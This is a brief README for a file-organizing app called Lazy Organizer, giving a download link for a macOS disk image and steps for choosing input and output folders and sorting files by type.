# Lazy Organizer

Lazy Organizer is a tool that organizes files.

## How to use
- First download the app [here](https://sc.warmraisin.com/slo.dmg)

- Then open the app and push the Settings button.

- In the settings, you can select the input folder and the output folder.

- Then push the Organize button.

- The app will then organize the files in the input folder into the output folder based on their file type.
